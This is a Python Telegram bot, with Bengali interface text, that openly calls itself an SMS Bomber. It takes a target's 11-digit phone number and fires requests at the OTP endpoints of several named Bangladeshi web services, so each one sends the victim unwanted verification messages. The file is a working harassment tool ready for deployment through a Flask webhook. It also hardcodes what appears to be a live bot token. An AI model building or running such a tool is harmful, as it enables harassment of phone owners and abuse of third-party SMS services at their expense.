import os
import telebot
import requests
from flask import Flask, request

# আপনার টেলিগ্রাম বট টোকেন
TOKEN = "8522736474:AAEeqI9riuBrlp8sCSOLyVXUtXHkbddru48"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# ওটিপি পাঠানোর জন্য শক্তিশালী এপিআই ফাংশন
def send_otp(phone):
    apis = [
        f"https://bikroy.com/data/is-number-registered?phone={phone}",
        f"https://www.shajgoj.com/wp-admin/admin-ajax.php?action=login_mobile_otp&mobile={phone}",
        f"https://osudpotro.com/api/v1/users/send-otp?phone={phone}",
        f"https://redx.com.bd/api/v1/send-otp?phone={phone}",
        f"https://paperfly.com.bd/api/v1/customer-login-otp?phone={phone}"
    ]
    
    success = 0
    for url in apis:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                success += 1
        except:
            continue
    return success

@bot.message_handler(commands=['start'])
def start(message):
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("💣 বোম্বিং শুরু করুন", callback_data="bomb"))
    
    welcome_text = (
        f"👋 স্বাগতম **{message.from_user.first_name}**!\n"
        f"এটি একটি শক্তিশালী SMS Bomber বট।\n\n"
        f"বোম্বিং করতে নিচের বাটনটি চাপুন।"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "bomb":
        msg = bot.send_message(call.message.chat.id, "📞 **টার্গেট নম্বরটি দিন (১১ ডিজিট):**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, start_attack)

def start_attack(message):
    phone = message.text
    if len(phone) == 11 and phone.isdigit():
        bot.send_message(message.chat.id, f"🚀 **{phone}** নম্বরে অ্যাটাক শুরু হয়েছে...")
        
        # ওটিপি পাঠানো হচ্ছে
        count = send_otp(phone)
        
        bot.send_message(message.chat.id, f"✅ অ্যাটাক সম্পন্ন! {count}টি ওটিপি পাঠানো হয়েছে।")
    else:
        bot.send_message(message.chat.id, "❌ ভুল নম্বর! সঠিক ১১ ডিজিটের নম্বর দিন।")

# Render Webhook Logic
@app.route('/' + TOKEN, methods=['POST'])
def getMessage():
    bot.process_new_updates([telebot.types.Update.de_json(request.stream.read().decode("utf-8"))])
    return "!", 200

@app.route("/")
def webhook():
    bot.remove_webhook()
    bot.set_webhook(url='https://' + request.host + '/' + TOKEN)
    return "<h1>Bomber Bot is Active!</h1>", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get('PORT', 5000)))
